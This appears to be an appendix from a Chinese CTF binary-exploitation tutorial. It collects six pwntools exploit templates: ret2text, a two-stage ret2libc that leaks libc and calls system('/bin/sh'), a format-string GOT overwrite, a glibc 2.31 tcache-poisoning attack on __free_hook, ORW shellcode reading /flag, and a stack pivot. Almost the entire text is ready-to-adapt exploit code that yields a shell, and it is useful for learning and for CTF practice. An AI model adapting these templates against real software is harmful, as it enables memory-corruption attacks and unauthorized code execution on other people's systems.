# 附录 B：漏洞利用模板集

> 以下模板是理解之后的总结，不是死记硬背的教条。使用前请根据具体题目调整偏移、地址和 libc 版本。

## 模板一：ret2text（有后门函数）

```python
from pwn import *
elf = ELF('./vuln', checksec=False)
p = process(elf.path)
offset = 72
payload = flat({offset: elf.sym['win']})
p.sendline(payload)
p.interactive()
```

## 模板二：ret2libc（64 位，两阶段）

```python
from pwn import *
elf = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process(elf.path)

offset, pop_rdi, ret = 72, 0x4012a3, 0x40101a

# 泄露
payload = flat({offset: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main']]})
p.sendlineafter(b'Input: ', payload)
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']

# getshell
payload = flat({offset: [ret, pop_rdi, next(libc.search(b'/bin/sh\x00')), libc.sym['system']]})
p.sendlineafter(b'Input: ', payload)
p.interactive()
```

## 模板三：格式化字符串任意写

```python
from pwn import *
elf = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process(elf.path)

# 泄露 libc
payload = p64(elf.got['puts']) + b'%6$s'
p.sendlineafter(b'Input: ', payload)
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']

# 覆写 GOT
payload = fmtstr_payload(6, {elf.got['puts']: libc.sym['system']})
p.sendlineafter(b'Input: ', payload)
p.sendline(b'/bin/sh')
p.interactive()
```

## 模板四：unsorted bin leak + tcache poisoning（2.31）

```python
add(0, 0x500, b'A'*8); add(1, 0x20, b'guard')
delete(0); show(0)
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc.address = leak - 0x1ebbe0

free_hook = libc.sym['__free_hook']
add(2, 0x30, b'B'*8); delete(2)
edit(2, p64(free_hook))
add(3, 0x30, b'C'*8)
add(4, 0x30, p64(libc.sym['system']))
add(5, 0x30, b'/bin/sh\x00'); delete(5)
p.interactive()
```

## 模板五：ORW（沙箱绕过）

```python
sc = asm(shellcraft.amd64.linux.cat('/flag'))
payload = flat({offset: shellcode_addr}) + sc
# 需要将 shellcode 写入可执行/已知地址
p.sendline(payload)
p.interactive()
```

## 模板六：栈迁移（leave; ret）

```python
bss = elf.bss() + 0x100
leave_ret = 0x401234

# ROP 链写到 bss（通过另一个输入函数）
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])

# 栈迁移
payload = flat({offset_to_rbp: [bss, leave_ret]})
p.sendline(payload)
p.interactive()
```
